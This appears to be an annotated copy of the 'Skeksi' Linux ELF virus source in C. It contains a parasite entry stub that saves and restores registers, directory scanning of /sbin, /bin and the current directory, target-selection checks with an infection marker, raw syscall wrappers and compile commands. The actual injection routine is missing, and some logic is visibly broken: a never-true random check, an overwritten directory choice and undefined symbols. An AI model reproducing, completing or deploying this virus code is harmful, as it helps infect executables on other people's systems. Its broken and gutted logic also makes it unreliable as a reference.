/*
 * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
 * Written by ElfMaster - ryan@bitlackeys.org
 *
 * Compile:
 * gcc -g -O0 -D ANTIDEBUG -D INFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
 * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
 * //PER This one works: gcc -N -static -fno-stack-protector -nostdlib virus.o -o virus
 *
 * Using -DDEBUG will allow Virus to print debug output
 * -N does not do the page align when the program gets loaded to the memory
 *
 * gcc -w -g -static -N -O0 -D INFECT_PLTGOT  -fno-stack-protector -nostdlib -fpic virus.c -o virus
 */

// PER: __asm__ volatile means executing the assembly instructions as it is
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

#define VIRUS_LAUNCHER_NAME "virus"

struct linux_dirent64
{
	uint64_t d_ino;
	int64_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[0];
} __attribute__((packed));

/* libc */

void Memset(void *mem, unsigned char byte, unsigned int len);
void _memcpy(void *, void *, unsigned int);
int _printf(char *, ...);
char *itoa(long, char *);
char *itox(long, char *);
int _puts(char *);
size_t _strlen(char *);
char *_strchr(const char *, int);
char *_strrchr(const char *, int);
int _strcmp(const char *, const char *);
int _memcmp(const void *, const void *, unsigned int);

/* syscalls */
void Exit(long);
void *_mmap(void *, unsigned long, unsigned long, unsigned long, long, unsigned long);
long _open(const char *, unsigned long, long);
long _write(long, char *, unsigned long);
int _read(long, char *, unsigned long);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
				unsigned int count);
int _close(unsigned int);
int _gettimeofday(struct timeval *, struct timezone *);

/* Customs */
unsigned long get_rip(void);
void end_code(void);
static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
void display_skeksi(void);

#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))

#if defined(DEBUG) && DEBUG > 0
#define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
										  __FILE__, __LINE__, __func__, ##args)
#else
#define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
#endif

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
#define STACK_SIZE 0x4000000

#define TMP ".xyz.skeksi.elf64"
#define RODATA_PADDING 18000 // enough bytes to also copy .rodata and skeksi_banner

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 // thankz Mr. h0ffman

#define __ASM__ asm __volatile__

extern long real_start;
extern long get_rip_label;

struct bootstrap_data
{
	int argc;
	char **argv;
};

// PER: Structure of the ELF executable
typedef struct elfbin
{
	Elf64_Ehdr *ehdr; // 64 bytes
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Dyn *dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	uint8_t *mem;
	size_t size;
	char *path;
	struct stat st;
	int fd;
	int original_virus_exe;
} elfbin_t;

#define DIR_COUNT 4 // PER: Number of directories

_start()
{
#if 0
	struct bootstrap_data bootstrap;
#endif
	/*
	 * Save register state before executing parasite
	 * code.
	 */

	// PER: saving the previous state of register in order to not hamper the host program
	__ASM__(
		".globl real_start	\n"
		"real_start:		\n"
		"push %rsp	\n"
		"push %rbp	\n"
		"push %rax	\n"
		"push %rbx	\n"
		"push %rcx	\n"
		"push %rdx	\n"
		"push %r8	\n"
		"push %r9	\n"
		"push %r10	\n"
		"push %r11	\n"
		"push %r12	\n"
		"push %r13	\n"
		"push %r14	\n"
		"push %r15	  ");

#if 0
	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
#endif
	/*
	 * Load bootstrap pointer as argument to do_main()
	 * and call it.
	 */
	__ASM__(
	// PER: #if 0 will not be compiled nor executed
#if 0
	 "leaq %0, %%rdi\n"
#endif
		"call do_main   " //:: "g"(bootstrap)
	);
	/*
	 * Restore register state
	 */
	__ASM__(
		"pop %r15	\n"
		"pop %r14	\n"
		"pop %r13	\n"
		"pop %r12	\n"
		"pop %r11	\n"
		"pop %r10	\n"
		"pop %r9	\n"
		"pop %r8	\n"
		"pop %rdx	\n"
		"pop %rcx	\n"
		"pop %rbx	\n"
		"pop %rax	\n"
		"pop %rbp	\n"
		"pop %rsp	\n"
		"add $0x8, %rsp\n"
		"jmp end_code	");
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.
 */
#define CHUNK_SIZE 256
void *vx_malloc(size_t len, uint8_t **mem)
{
	// PER: len=filename+directory_name+2
	// PER: mem contains the address that contains a NULL pointer
	if (*mem == NULL)
	{
		*mem = _mmap(NULL, 0x200000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		// PER: **mem may be read and written, PROT_READ means protection-read, etc

		if (*mem == MAP_FAILED)
		{
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += CHUNK_SIZE;
	return (void *)((char *)*mem - len);
}

static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
{
	*seed = *seed * 1103515245 + 12345;
	return (unsigned int)(*seed / 65536) & 32767;
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */
static inline uint32_t get_random_number(int max)
{
	struct timeval tv;
	_gettimeofday(&tv, NULL);
	return _rand(&tv.tv_usec) % max;
}

static inline char *randomly_select_dir(char **dirs)
{
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char *full_path(char *exe, char *dir, uint8_t **heap)
{
	// PER: exe is the filename
	// PER: dir contains the directory name/location
	// PER: heap is contains the address that contains a NULL pointer

	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
	// PER: ptr contains the (address returned by malloc + 256 -(len(exec) + len(dir)+2)
	// `2` is for NULL ending of exe and dir
	// PER: vx_malloc also sets the variable `heap` to (address returned by malloc + 256)

	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, _strlen(dir));
	ptr[_strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
	return ptr;
}

#define JMPCODE_LEN 6

/*
 * Must be ELF _fstat
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;

	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0)
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if (_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0)
		return -1;
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER) // already infected? Then skip this file
		return -1;
	if (ehdr->e_type != ET_EXEC)
		return -1;
	if (ehdr->e_machine != EM_X86_64)
		return -1;
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_DYNAMIC)
			dynamic++;
	if (!dynamic)
		return -1;
	return 0;
}

void do_main(struct bootstrap_data *bootstrap)
{
	Elf64_Ehdr *ehdr; // PER: structure of elf header
	Elf64_Phdr *phdr; // PER: structure of program header
	Elf64_Shdr *shdr; // PER: structure of section header

	uint8_t *mem, *heap = NULL; // PER: 8 bytes unsigned integer

	long new_base, base_addr, evilputs_addr, evilputs_offset;

	struct linux_dirent64 *d;

	int bpos, fcount, dd, nread;

	char *dir = NULL, **files, *fpath, dbuf[32768]; // PER: dbuf stores the directory entries (linux_dirent) in the directory

	struct stat st;
	mode_t mode;

	uint32_t rnum;

	elfbin_t self, target; // PER: ELF file of virus and target

	int scan_count = DIR_COUNT;
	int icount = 0;
	int paddingSize;
	/*
	 * NOTE:
	 * we can't use string literals because they will be
	 * stored in either .rodata or .data sections.
	 */
	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin"}; // by root PER: addresses of the directories to attack if the user of root
	char cwd[2] = {'.', '\0'};									// PER: by normal user(non-root user)

rescan:
	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs); // PER: choosing a directory based on user id to attack
	dir = cwd;														 // PER: choosing a directory based on user id to attack

	if (!_strcmp(dir, ".")) // PER: if it's a current directory
		scan_count = 1;		// PER: if non-root user
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);

	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0); // PER: dd is a file descriptor

	// PER: if open fails
	if (dd < 0)
	{
		DEBUG_PRINT("open failed\n");
		return;
	}

	// PER: break at $14 = (void (*)()) 0x401dfb <do_main+264>
	for (;;)
	{
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); // 32768 is the size of dbuf
		// PER: nread is the number of bytes read from the directory, `all files' details directly in a single `dbuf` buffer`

		// PER: error
		if (nread < 0)
		{
			return;
		}

		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++)
		{
			// PER: It is ensured that atleast one healthy file(that passes the criteria) is infected
			d = (struct linux_dirent64 *)(dbuf + bpos);
			bpos += d->d_reclen - 1;
			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) // PER: linux_dirent64 of virus is 80
				continue;
			if (d->d_name[0] == '.')
				continue;
			// PER: fpath contains the address that point to {[dir]+['/']+[d->d_name]+[NULL]+[memory allocated my malloc]}
			// PER: all in the heap section of the process memory that is called by the full_path function.

			// PER: checking criteria
			// 1. atleast one dynamic segment(dynamically linked)
			// 2. should be an x86_64 ET_EXEC elf file not already infected
			// 3. size>=4096 bytes
			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
				continue;	 // PER: criteria not matched, move on to next file in the directory
			if (icount == 0) // PER: It is ensured that atleast one healthy file will be infected
				goto infect;
			rnum = get_random_number(10);
			if (rnum != rnum) // PER: 9/10 probability that rnum is not the LUCKY_NUMBER
				continue;
		infect:
			icount++;
		}
	}
	if (--scan_count > 0)
	{
		_close(dd);
		goto rescan;
	}
}

int _getuid(void)
{
	unsigned long ret;
	__asm__ volatile("mov $102, %rax\n"
					 "syscall");
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

void Exit(long status)
{
	__asm__ volatile("mov %0, %%rdi\n"
					 "mov $60, %%rax\n"
					 "syscall"
					 :
					 : "r"(status));
}

long _open(const char *path, unsigned long flags, long mode)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $2, %%rax\n"
		"syscall"
		:
		: "g"(path), "g"(flags), "g"(mode));
	asm("mov %%rax, %0"
		: "=r"(ret));

	return ret;
}

int _close(unsigned int fd)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov $3, %%rax\n"
		"syscall"
		:
		: "g"(fd));
	return (int)ret;
}

int _read(long fd, char *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $0, %%rax\n"
		"syscall"
		:
		: "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

long _write(long fd, char *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $1, %%rax\n"
		"syscall"
		:
		: "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return ret;
}

int _fsync(int fd)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov $74, %%rax\n"
		"syscall"
		:
		: "g"(fd));

	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;

	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov $9, %%rax\n"
		"syscall\n"
		:
		: "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (void *)ret;
}

int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
				unsigned int count)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $217, %%rax\n"
		"syscall" ::"g"(fd),
		"g"(dirp), "g"(count));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

int _gettimeofday(struct timeval *tv, struct timezone *tz)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov $96, %%rax\n"
		"syscall" ::"g"(tv),
		"g"(tz));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

void _memcpy(void *dst, void *src, unsigned int len)
{
	int i;
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dst;

	for (i = 0; i < len; i++)
	{
		*d = *s;
		s++, d++;
	}
}

void Memset(void *mem, unsigned char byte, unsigned int len)
{
	unsigned char *p = (unsigned char *)mem;
	int i = len;
	while (i--)
	{
		*p = byte;
		p++;
	}
}

int _printf(char *fmt, ...)
{
	int in_p;
	unsigned long dword;
	unsigned int word;
	char numbuf[26] = {0};
	__builtin_va_list alist;

	in_p;
	__builtin_va_start((alist), (fmt));

	in_p = 0;
	while (*fmt)
	{
		if (*fmt != '%' && !in_p)
		{
			_write(1, fmt, 1);
			in_p = 0;
		}
		else if (*fmt != '%')
		{
			switch (*fmt)
			{
			case 's':
				dword = (unsigned long)__builtin_va_arg(alist, long);
				_puts((char *)dword);
				break;
			case 'u':
				word = (unsigned int)__builtin_va_arg(alist, int);
				_puts(itoa(word, numbuf));
				break;
			case 'd':
				word = (unsigned int)__builtin_va_arg(alist, int);
				_puts(itoa(word, numbuf));
				break;
			case 'x':
				dword = (unsigned long)__builtin_va_arg(alist, long);
				_puts(itox(dword, numbuf));
				break;
			default:
				_write(1, fmt, 1);
				break;
			}
			in_p = 0;
		}
		else
		{
			in_p = 1;
		}
		fmt++;
	}
	return 1;
}
char *itoa(long x, char *t)
{
	int i;
	int j;

	i = 0;
	do
	{
		t[i] = (x % 10) + '0';
		x /= 10;
		i++;
	} while (x != 0);

	t[i] = 0;

	for (j = 0; j < i / 2; j++)
	{
		t[j] ^= t[i - j - 1];
		t[i - j - 1] ^= t[j];
		t[j] ^= t[i - j - 1];
	}

	return t;
}
char *itox(long x, char *t)
{
	int i;
	int j;

	i = 0;
	do
	{
		t[i] = (x % 16);

		/* char conversion */
		if (t[i] > 9)
			t[i] = (t[i] - 10) + 'a';
		else
			t[i] += '0';

		x /= 16;
		i++;
	} while (x != 0);

	t[i] = 0;

	for (j = 0; j < i / 2; j++)
	{
		t[j] ^= t[i - j - 1];
		t[i - j - 1] ^= t[j];
		t[j] ^= t[i - j - 1];
	}

	return t;
}

int _puts(char *str)
{
	_write(1, str, _strlen(str));
	_fsync(1);

	return 1;
}

size_t _strlen(char *s)
{
	size_t sz;

	for (sz = 0; s[sz]; sz++)
		;
	return sz;
}

int _strcmp(const char *s1, const char *s2)
{
	for (; *s1 == *s2; s1++, s2++)
		if (*s1 == '\0')
			return 0;
	return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
}

int _memcmp(const void *s1, const void *s2, unsigned int n)
{
	unsigned char u1, u2;

	for (; n--; s1++, s2++)
	{
		u1 = *(unsigned char *)s1;
		u2 = *(unsigned char *)s2;
		if (u1 != u2)
		{
			return (u1 - u2);
		}
	}
}

unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__(
		"call get_rip_label	\n"
		".globl get_rip_label	\n"
		"get_rip_label:		\n"
		"pop %%rax		\n"
		"mov %%rax, %0"
		: "=r"(ret));

	return ret;
}

/*
 * end_code() gets over-written with a trampoline
 * that jumps to the original entry point.
 */
void end_code()
{
	Exit(0);
}
